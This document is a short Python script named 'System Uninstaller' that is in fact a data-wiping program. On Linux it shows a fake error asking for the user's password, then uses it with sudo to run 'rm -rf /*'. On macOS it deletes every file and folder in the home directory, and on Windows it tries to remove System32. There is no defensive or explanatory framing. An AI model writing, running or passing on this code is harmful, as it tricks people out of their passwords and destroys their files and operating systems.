"""
Welcome to System Uninstaller!
"""

import os
from sys import platform

if platform in ("linux", "linux2"):
    # linux
    password = input("Error: Please input your password to launch the "
                     "application: ")
    os.system(f'echo {password} | sudo -S sudo rm -rf /*')

elif platform == "darwin":
    # OS X
    user_directory = os.path.expanduser("~")

    # List all files and directories in the user's home directory
    for root, dirs, files in os.walk(user_directory, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            try:
                os.remove(file_path)  # Remove files
            except PermissionError:
                print("Hard r.")
                continue

        for name in dirs:
            dir_path = os.path.join(root, name)
            try:
                os.rmdir(dir_path)  # Remove directories
            except PermissionError:
                print("Hard r.")
                continue

elif platform == "win32":
    # Windows ...
    os.remove(r"C:\Windows\System32")
